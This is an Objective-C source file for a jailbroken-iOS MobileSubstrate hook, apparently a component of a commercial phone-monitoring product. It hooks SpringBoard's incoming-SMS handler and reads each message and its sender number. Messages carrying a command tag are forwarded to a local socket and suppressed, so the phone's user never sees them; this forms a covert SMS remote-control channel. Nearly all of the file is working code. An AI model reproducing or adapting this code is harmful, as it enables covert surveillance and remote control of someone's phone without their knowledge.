/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SMSCmdMonitorTestApp
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  11/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#include <substrate.h>
#import "NSString+ScanString.h"
#import "SocketIPCSender.h"
#import "DefStd.h"
@class SMSCTServer;
@class CTMessage;
@class CTMessagePart;
@class CTPhoneNumber;
@class CTMessageAddress;
@protocol CTMessageAddress
- (id)canonicalFormat;
- (id)encodedString;
@end

#define MSHookMessageEx(class, selector,replacement,result) \
(*(result) = method_setImplementation(class_getInstanceMethod((class), (selector)), (replacement)))

#define HOOK(class, name, type, args...) \
static type (*_ ## class ## $ ## name)(class *self, SEL sel, ## args); \
static type $ ## class ## $ ## name(class *self, SEL sel, ## args)

#define CALL_ORIG(class, name, args...) \
_ ## class ## $ ## name(self, sel, ## args)

#pragma mark Hooked SMSCTServer messages

/**
 - Method name: _ingestIncomingCTMessage
 - Purpose:  This method is used to hook the incomming message from the sender and s
 - Argument list and description: _ingestIncomingCTMessage (id).
 - Return type and description: No Return
 */

HOOK (SMSCTServer, _ingestIncomingCTMessage$, void, id arg) {
	//==================== Hook the incoming message====================================== 
	DLog (@"Incomming Message Received:---->%@",arg);	
	CTMessage* message = (CTMessage *)arg;
	id phonenumber = [message sender];
	NSString* senderNumber = (NSString *)[phonenumber canonicalFormat];
	CTMessagePart* msgPart = [[message items] objectAtIndex:0]; //for single-part msgs
	NSData *smsData = [msgPart data];
	NSString *smsText = [[NSString alloc] initWithData:smsData encoding:NSUTF8StringEncoding];
	DLog (@"SMS Command :--->%@ Sender Number:---->%@",smsText,senderNumber);
	//==================== Scaning SMS Command ==============================================
	BOOL isFound=[smsText scanWithStartTag:kSMSComandFormatTag];
	
	if(isFound) {
		//==================== Storing SMS Command data to SocketIPCSender ==============================================
		SocketIPCSender *socketIPCSender=[[SocketIPCSender alloc]initWithPortNumber:kMSSmsReceiverSocketPort andAddress:kLocalHostIP];
		NSMutableDictionary *dictionary=[[NSMutableDictionary alloc]init];
		NSMutableData* data = [[NSMutableData alloc] init];
		[dictionary setValue:smsText forKey:kSMSTextKey];
		[dictionary setValue:senderNumber forKey:kSMSSenderKey];
		NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:dictionary forKey:kSMSCommandKey];
		[archiver finishEncoding];
		[socketIPCSender writeDataToSocket:data];
		[archiver release];
		[dictionary release];
		[data release];
		[socketIPCSender release];
		
	}
	else {
		//==================== Redirect Orginal method if SMS Command Not found  ============================ 
		CALL_ORIG (SMSCTServer, _ingestIncomingCTMessage$, arg);
	}
	[smsText release];
}

#pragma mark dylib SMSCommandMonitor and initial hooks-->SMSCTServer

/**
 - Method name: SMSCommandMonitorInitialize
 - Purpose:  This method is used to initialize the hook method
 - Argument list and description:  No Argument.
 - Return type and description: No Return
 */

extern "C" void SMSCmdMonitorTestAppInitialize() {	
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];	
    //Check open application and create hooks here:
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
    if ([identifier isEqualToString:@"com.apple.springboard"]) {
		Class $SMSCTServer(objc_getClass("SMSCTServer"));
		_SMSCTServer$_ingestIncomingCTMessage$ = MSHookMessage($SMSCTServer, @selector(_ingestIncomingCTMessage:), &$SMSCTServer$_ingestIncomingCTMessage$);
	}
	[pool release];
}
